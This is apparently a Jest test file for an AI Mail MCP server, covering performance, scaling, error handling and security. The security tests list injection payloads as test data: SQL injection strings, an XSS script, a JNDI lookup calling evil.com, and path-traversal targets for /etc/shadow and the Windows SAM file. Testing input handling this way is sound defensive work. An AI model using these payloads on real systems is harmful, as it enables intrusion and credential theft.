/**
 * Performance and Security tests for AI Mail MCP Server
 */

import { describe, test, expect, beforeEach, afterEach, jest } from '@jest/globals';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import Database from 'better-sqlite3';

// Mock dependencies
jest.mock('better-sqlite3');
jest.mock('node-machine-id', () => ({
  machineIdSync: () => 'perf-test-machine-id'
}));

describe('AI Mail MCP Server Performance Tests', () => {
  let tempDir: string;
  let mockDb: any;
  let server: any;

  beforeEach(async () => {
    tempDir = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'ai-mail-perf-'));
    
    // Setup performance-optimized mock database
    const mockPrepare = jest.fn();
    const mockExec = jest.fn();
    const mockGet = jest.fn().mockReturnValue(null);
    const mockAll = jest.fn().mockReturnValue([]);
    const mockRun = jest.fn().mockReturnValue({ changes: 1 });
    const mockClose = jest.fn();

    mockDb = {
      prepare: mockPrepare.mockReturnValue({
        get: mockGet,
        all: mockAll,
        run: mockRun
      }),
      exec: mockExec,
      close: mockClose
    };

    (Database as jest.MockedClass<typeof Database>).mockReturnValue(mockDb);

    process.env.AI_MAIL_DATA_DIR = tempDir;
    process.env.AI_AGENT_NAME = 'perf-test-agent';
    process.env.NODE_ENV = 'test';
  });

  afterEach(async () => {
    if (server) {
      server = null;
    }
    await fs.promises.rm(tempDir, { recursive: true, force: true });
    delete process.env.AI_MAIL_DATA_DIR;
    delete process.env.AI_AGENT_NAME;
    jest.clearAllMocks();
  });

  describe('Message Processing Performance', () => {
    test('should process 1000 messages within performance threshold', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      // Generate large dataset
      const messages = Array.from({ length: 1000 }, (_, i) => ({
        id: `perf-msg-${i}`,
        sender: `sender-${i % 100}`,
        recipient: 'perf-test-agent',
        subject: `Performance Test Message ${i}`,
        body: `This is a performance test message with content ${i}. `.repeat(10),
        priority: ['urgent', 'high', 'normal', 'low'][i % 4],
        tags: [`tag-${i % 10}`, `category-${i % 5}`],
        thread_id: `thread-${Math.floor(i / 10)}`,
        timestamp: new Date(Date.now() - i * 1000).toISOString(),
        read: i % 3 === 0,
        archived: false
      }));

      mockDb.prepare.mockReturnValue({
        all: jest.fn().mockReturnValue(messages)
      });

      const startTime = performance.now();
      const result = await server.handleCheckMail({
        unread_only: false,
        limit: 1000
      });
      const duration = performance.now() - startTime;

      expect(result.content[0].text).toContain('Found 1000 message(s)');
      expect(duration).toBeLessThan(100); // Should complete within 100ms
    });

    test('should handle concurrent message operations efficiently', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      const concurrentOperations = 50;
      const operationsPerSecond = 1000; // Target: 1000 operations per second

      // Mock successful operations
      mockDb.prepare.mockReturnValue({
        get: jest.fn().mockReturnValue({ name: 'test-recipient' }),
        run: jest.fn().mockReturnValue({ changes: 1 }),
        all: jest.fn().mockReturnValue([])
      });

      const operations = Array.from({ length: concurrentOperations }, async (_, i) => {
        const operationType = i % 3;
        
        switch (operationType) {
          case 0:
            return server.handleSendMail({
              recipient: 'test-recipient',
              subject: `Concurrent Message ${i}`,
              body: `Message body ${i}`,
              priority: 'normal'
            });
          case 1:
            return server.handleCheckMail({ unread_only: true, limit: 10 });
          case 2:
            return server.handleListAgents({ active_only: false });
          default:
            return Promise.resolve({ content: [{ type: 'text', text: 'default' }] });
        }
      });

      const startTime = performance.now();
      const results = await Promise.all(operations);
      const duration = performance.now() - startTime;

      const actualOpsPerSecond = (concurrentOperations / duration) * 1000;

      expect(results).toHaveLength(concurrentOperations);
      expect(actualOpsPerSecond).toBeGreaterThan(operationsPerSecond / 2); // At least 50% of target
    });

    test('should maintain performance with large message search', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      // Simulate large search result set
      const searchResults = Array.from({ length: 500 }, (_, i) => ({
        id: `search-msg-${i}`,
        sender: `user-${i % 50}`,
        recipient: 'perf-test-agent',
        subject: `Search Test Message ${i} with keywords important urgent task`,
        body: `This message contains searchable content: ${['important', 'urgent', 'task', 'project', 'deadline'][i % 5]}`,
        priority: 'normal',
        tags: [`search-tag-${i % 20}`],
        thread_id: `search-thread-${i}`,
        timestamp: new Date(Date.now() - i * 60000).toISOString(),
        read: false,
        archived: false
      }));

      mockDb.prepare.mockReturnValue({
        all: jest.fn().mockReturnValue(searchResults)
      });

      const startTime = performance.now();
      const result = await server.handleSearchMessages({
        query: 'important',
        limit: 500
      });
      const duration = performance.now() - startTime;

      expect(result.content[0].text).toContain('Found 500 message(s) matching "important"');
      expect(duration).toBeLessThan(200); // Should complete within 200ms
    });
  });

  describe('Memory Usage and Resource Management', () => {
    test('should not leak memory during intensive operations', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      const initialMemory = process.memoryUsage().heapUsed;
      
      // Perform intensive operations
      for (let iteration = 0; iteration < 10; iteration++) {
        const largeBatch = Array.from({ length: 100 }, (_, i) => ({
          id: `memory-test-${iteration}-${i}`,
          sender: `sender-${i}`,
          recipient: 'perf-test-agent',
          subject: `Memory Test ${i}`,
          body: 'x'.repeat(1000), // 1KB message body
          priority: 'normal',
          tags: [`iteration-${iteration}`],
          thread_id: `thread-${i}`,
          timestamp: new Date().toISOString(),
          read: false,
          archived: false
        }));

        mockDb.prepare.mockReturnValue({
          all: jest.fn().mockReturnValue(largeBatch)
        });

        await server.handleCheckMail({ unread_only: false, limit: 100 });
        
        // Force garbage collection if available
        if (global.gc) {
          global.gc();
        }
      }

      const finalMemory = process.memoryUsage().heapUsed;
      const memoryIncrease = finalMemory - initialMemory;
      const maxAcceptableIncrease = 50 * 1024 * 1024; // 50MB

      expect(memoryIncrease).toBeLessThan(maxAcceptableIncrease);
    });

    test('should handle database connection pooling efficiently', async () => {
      const { AIMailServer } = require('../src/index');
      
      // Create multiple server instances to test connection management
      const servers = Array.from({ length: 5 }, () => new AIMailServer());

      // Each server should have its own database connection
      expect(Database).toHaveBeenCalledTimes(5);

      // Cleanup
      servers.forEach(s => s = null);
    });
  });

  describe('Scalability Tests', () => {
    test('should scale with increasing agent count', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      const agentCounts = [10, 50, 100, 500];
      const performanceResults: number[] = [];

      for (const agentCount of agentCounts) {
        const agents = Array.from({ length: agentCount }, (_, i) => ({
          name: `scale-agent-${i}`,
          last_seen: new Date().toISOString(),
          status: 'online',
          machine_id: `machine-${i}`
        }));

        mockDb.prepare.mockReturnValue({
          all: jest.fn().mockReturnValue(agents)
        });

        const startTime = performance.now();
        await server.handleListAgents({ active_only: false });
        const duration = performance.now() - startTime;

        performanceResults.push(duration);
      }

      // Performance should scale sub-linearly (better than O(n))
      const scalingRatio = performanceResults[3] / performanceResults[0]; // 500 agents / 10 agents
      expect(scalingRatio).toBeLessThan(25); // Should be better than linear scaling
    });

    test('should handle high-frequency message bursts', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      const burstSize = 100;
      const burstInterval = 10; // ms

      mockDb.prepare.mockReturnValue({
        get: jest.fn().mockReturnValue({ name: 'burst-recipient' }),
        run: jest.fn().mockReturnValue({ changes: 1 })
      });

      const burstPromises: Promise<any>[] = [];
      
      for (let i = 0; i < burstSize; i++) {
        const promise = new Promise(resolve => {
          setTimeout(async () => {
            const result = await server.handleSendMail({
              recipient: 'burst-recipient',
              subject: `Burst Message ${i}`,
              body: `Burst test message ${i}`,
              priority: 'normal'
            });
            resolve(result);
          }, i * burstInterval);
        });
        burstPromises.push(promise);
      }

      const startTime = performance.now();
      const results = await Promise.all(burstPromises);
      const duration = performance.now() - startTime;

      expect(results).toHaveLength(burstSize);
      expect(duration).toBeLessThan(2000); // Should complete within 2 seconds
    });
  });

  describe('Security Tests', () => {
    test('should prevent SQL injection in message content', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      const maliciousInputs = [
        "'; DROP TABLE messages; --",
        "' OR '1'='1",
        "'; INSERT INTO agents VALUES ('hacker', 'now', 'online', 'evil'); --",
        "' UNION SELECT * FROM agents WHERE '1'='1",
        "<script>alert('xss')</script>",
        "${jndi:ldap://evil.com/a}"
      ];

      mockDb.prepare.mockReturnValue({
        get: jest.fn().mockReturnValue({ name: 'test-recipient' }),
        run: jest.fn().mockReturnValue({ changes: 1 })
      });

      for (const maliciousInput of maliciousInputs) {
        const result = await server.handleSendMail({
          recipient: 'test-recipient',
          subject: maliciousInput,
          body: maliciousInput,
          priority: 'normal'
        });

        expect(result.content[0].text).toContain('Message sent successfully');
        // Database should receive the input as a parameter, not as part of the query
        expect(mockDb.prepare).toHaveBeenCalledWith(expect.any(String));
      }
    });

    test('should validate agent name format', async () => {
      const { AIMailServer } = require('../src/index');
      
      const invalidAgentNames = [
        '', // Empty
        'a', // Too short
        'x'.repeat(100), // Too long
        'agent@evil.com', // Invalid characters
        '-invalid', // Starts with dash
        'invalid-', // Ends with dash
        'agent with spaces',
        'agent\nwith\nnewlines',
        'agent\twith\ttabs'
      ];

      // Mock AgentIdentifier.validate_agent_name to return false for invalid names
      const originalEnv = process.env.AI_AGENT_NAME;
      
      for (const invalidName of invalidAgentNames) {
        process.env.AI_AGENT_NAME = invalidName;
        
        // Should either reject the name or sanitize it
        const server = new AIMailServer();
        expect(server.agentName).not.toBe(invalidName);
      }

      process.env.AI_AGENT_NAME = originalEnv;
    });

    test('should handle oversized message content', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      const oversizedContent = 'x'.repeat(1024 * 1024); // 1MB message
      
      mockDb.prepare.mockReturnValue({
        get: jest.fn().mockReturnValue({ name: 'test-recipient' }),
        run: jest.fn().mockReturnValue({ changes: 1 })
      });

      const result = await server.handleSendMail({
        recipient: 'test-recipient',
        subject: 'Oversized Message Test',
        body: oversizedContent,
        priority: 'normal'
      });

      expect(result.content[0].text).toContain('Message sent successfully');
    });

    test('should prevent directory traversal in file operations', async () => {
      const { AIMailServer } = require('../src/index');
      
      const maliciousPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/etc/shadow',
        'C:\\Windows\\System32\\config\\SAM',
        '....//....//....//etc/passwd'
      ];

      // Test that the server properly sanitizes paths
      const originalDataDir = process.env.AI_MAIL_DATA_DIR;
      
      for (const maliciousPath of maliciousPaths) {
        process.env.AI_MAIL_DATA_DIR = maliciousPath;
        
        const server = new AIMailServer();
        // Should not use the malicious path directly
        expect(server.dataDir).not.toBe(maliciousPath);
      }

      process.env.AI_MAIL_DATA_DIR = originalDataDir;
    });

    test('should rate limit message operations', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      mockDb.prepare.mockReturnValue({
        get: jest.fn().mockReturnValue({ name: 'test-recipient' }),
        run: jest.fn().mockReturnValue({ changes: 1 })
      });

      // Simulate rapid-fire message sending
      const rapidMessages = Array.from({ length: 100 }, (_, i) =>
        server.handleSendMail({
          recipient: 'test-recipient',
          subject: `Rapid Message ${i}`,
          body: `Rapid test message ${i}`,
          priority: 'normal'
        })
      );

      const startTime = performance.now();
      const results = await Promise.all(rapidMessages);
      const duration = performance.now() - startTime;

      // All messages should succeed (no built-in rate limiting in current implementation)
      // But this test establishes the baseline for future rate limiting features
      expect(results).toHaveLength(100);
      results.forEach(result => {
        expect(result.content[0].text).toContain('Message sent successfully');
      });
    });
  });

  describe('Error Handling and Resilience', () => {
    test('should handle database timeouts gracefully', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      // Simulate database timeout
      mockDb.prepare.mockImplementation(() => {
        return new Promise(resolve => {
          setTimeout(() => {
            throw new Error('Database timeout');
          }, 100);
        });
      });

      await expect(server.handleCheckMail({})).rejects.toThrow('Database timeout');
    });

    test('should recover from transient failures', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      let callCount = 0;
      mockDb.prepare.mockImplementation(() => {
        callCount++;
        if (callCount <= 2) {
          throw new Error('Transient failure');
        }
        return {
          all: jest.fn().mockReturnValue([])
        };
      });

      // First two calls should fail
      await expect(server.handleCheckMail({})).rejects.toThrow('Transient failure');
      await expect(server.handleCheckMail({})).rejects.toThrow('Transient failure');
      
      // Third call should succeed
      const result = await server.handleCheckMail({});
      expect(result.content[0].text).toBe('📭 No new messages');
    });

    test('should handle malformed database responses', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      const malformedResponses = [
        null,
        undefined,
        'string instead of object',
        { incomplete: 'object' },
        { id: null, subject: undefined },
        [] // Array instead of object
      ];

      for (const malformedResponse of malformedResponses) {
        mockDb.prepare.mockReturnValueOnce({
          get: jest.fn().mockReturnValue(malformedResponse)
        });

        // Should handle gracefully without crashing
        try {
          await server.handleReadMessage({ message_id: 'test-id' });
        } catch (error) {
          // Expected to throw, but should be a controlled error
          expect(error).toBeInstanceOf(Error);
        }
      }
    });
  });

  describe('Resource Cleanup', () => {
    test('should properly cleanup resources on shutdown', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      // Simulate server shutdown
      process.emit('SIGINT');
      
      // Should have called database close
      expect(mockDb.prepare).toHaveBeenCalledWith(
        expect.stringContaining('UPDATE agents SET status = ?')
      );
    });

    test('should handle graceful degradation under resource pressure', async () => {
      const { AIMailServer } = require('../src/index');
      server = new AIMailServer();

      // Simulate resource pressure by creating many operations
      const stressOperations = Array.from({ length: 1000 }, async (_, i) => {
        mockDb.prepare.mockReturnValue({
          all: jest.fn().mockReturnValue([])
        });

        return server.handleCheckMail({ limit: 1 });
      });

      const startTime = performance.now();
      const results = await Promise.allSettled(stressOperations);
      const duration = performance.now() - startTime;

      const successfulResults = results.filter(r => r.status === 'fulfilled');
      const failedResults = results.filter(r => r.status === 'rejected');

      // Should maintain at least 90% success rate under stress
      const successRate = successfulResults.length / results.length;
      expect(successRate).toBeGreaterThan(0.9);
      
      // Should complete within reasonable time even under stress
      expect(duration).toBeLessThan(10000); // 10 seconds max
    });
  });
});
